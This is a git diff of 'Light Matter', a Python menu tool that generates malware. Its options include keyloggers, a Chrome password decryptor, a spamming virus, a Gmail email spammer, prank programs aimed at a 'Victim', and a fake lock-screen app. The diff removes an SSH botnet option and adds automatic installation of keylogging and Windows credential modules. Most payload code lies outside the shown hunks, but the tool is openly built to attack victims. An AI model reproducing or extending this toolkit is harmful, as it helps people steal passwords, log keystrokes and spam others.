@@ -1,8 +1,25 @@
-import os, pynput, socket
-import imp, pip
+
+import os
+import socket
+try:
+    import pynput
+except ImportError:
+    print("Pynput not found. Installing.")
+    os.system("py -m pip install pynput")
+try:
+    import imp
+except ImportError:
+    print("imp not found. Installing.")
+    os.system("py -m pip install imp")
+
 from os import getenv
 import sqlite3
-import win32crypt
+
+try:
+    import win32crypt
+except ImportError:
+    os.system("py -m pip install pypiwin32")
+
 import smtplib
 import time
 
@@ -16,7 +33,7 @@ print("""\033[1;35;40m
              \/   ___  |____|_\__, |_||_\__|       |_|  |_\__,_|\__|\__\___|_|    ___   \/ 
                  |___|        |___/                                              |___| 
 
-                           || An all in One tool for Beginner Hacking ||  
+                           || An Essential Program made for the Learning one ||  
                             ----------- || Version 2 || -------------
     """)
 
@@ -201,7 +218,7 @@ def __main__():
     def virus():
         print("[+] Available Modules : ")
         print("\033[1;37;40mSelect Virus Type : ")
-        print("\033[1;34;40m[*] All the Useless Stuff for People Learning :")
+        print("\033[1;34;40m[*] All the Stuff for People Learning :")
         print("\033[1;33;40m[1] MagicText - Automatically Writes Text every 10 Seconds to Scare the shit out of Victim.")
         print("[2] MagicDesktop - Automatically Changes Desktop Wallpaper from time to time.")
         print("[3] MagicClicks - Automatically Right/Left Click to Scare the shit out of Victim.")
@@ -210,10 +227,9 @@ def __main__():
         print("[6] Normal log to .txt Keylogger")
         print("\033[1;34;40m[*] For Hackers : ")
         print("\033[1;33;40m[7] Anti-Chrome - Decrypt your Chrome Passwords.")
-        print("[8] Generate a SSH Botnet (BETA. May not Work on Windows)")
-        print("[9] Ded Virus Command Line Spammer - Python Version.")
-        print("[10] Email Spammer - GMAIL")
-        print("[11] A Fake 'You've BEEN HACKED' Application with Graphical User Interface.")
+        print("[8] Ded Virus Command Line Spammer - Python Version.")
+        print("[9] Email Spammer - GMAIL")
+        print("[10] A Fake 'You've BEEN HACKED' Application with Graphical User Interface.")
         print("\033[1;34;40m[*] Local and Remote Exploits : ")
         print("\033[1;33;40m[*] Coming in Version 3.")
         type = input("\033[1;32;40mFastCorp>\033[1;37;40m$~/Virus Type : \033[1;32;40m")
@@ -270,25 +286,7 @@ def __main__():
             elif(check == "n" or "N"):
                 print("[+] Ok.")
                 input("")
-                __main__()
         elif(type == "8"):
-            print("[*] You have Selected SSH Botnet.")
-            print("[+] Please use this on Linux to Avoid any Errors.")
-            check = input("[!] Edit the BOTNET Script and change Commands/Hosts? (Y/N) :")
-            if(check == "Y" or "y"):
-                print("[!] Ok!")
-                print("[*] Edit lines only which are below Python Comments. EG: #This is a comment.")
-                os.system("notepad files/botnet.py")
-                print("[+] BOTNET Script : files/botnet.py.")
-                input("")
-                __main__()
-
-            elif(check == "n" or "N"):
-                print("[+] BOTNET Script : files/botnet.py.")
-                input("")
-                __main__()
-
-        elif(type == "9"):
             print("[*] You have Selected Ded Virus.")
             print("\033[1;37;40m[!] When Generated Read the Code of this Virus.")
             file = open("ded.py", "w")
@@ -305,7 +303,7 @@ def __main__():
             input("[+] Done")
             __main__()
 
-        elif(type == "10"):
+        elif(type == "9"):
             print("[*] This isn't exactly a Virus.")
             print("[*] You have Selected Email Spammer.")
 
@@ -348,11 +346,16 @@ def __main__():
                 print("[-] Error : ", er)
                 input("[*] Try Again.")
                 __main__()  
-        elif(type == "11"):
+        elif(type == "10"):
             print("[*] You have Selected Fake GUI Hack Application.")
-            print("[!] Unlock Key Required. That will be Able to Unlock this without Closing from Taskmgr :s ")    
-            input("[!] Press Enter to Edit the Key.")
-            os.system("notepad files/fakeApp.py")
+            print("[!] An Unlock key is Required.")
+            unlock_key = input("[?] Enter Unlock key : ")
+
+            keyFile = open("key", "w+")
+            keyFile.write(unlock_key)
+            keyFile.close()
+
+            print("[+] Program Available in Root Folder of Light Matter.")
             input("[!] Done.")
             __main__()
             
@@ -367,7 +370,6 @@ def __main__():
         print("[+] HELP : ")
         print("[+] help - Print this help message")
         print("[+] virus - Start Virus Generation.")
-        print("[+] firstrun - Check & install required Modules")
         print("[+] info - Display information")
         print("[+] exit - Obvious.")
         __main__()
@@ -376,10 +378,6 @@ def __main__():
     elif(cmd == "exit"):
         SystemExit()
         exit
-    elif(cmd == "firstrun"):
-        print("[*] Run the Setup script to install required modules.")
-        input("")
-        __main__()
     elif(cmd == "info"):
         print("*_ Light Matter _*")
         print("Coded by : F.A.S.T")
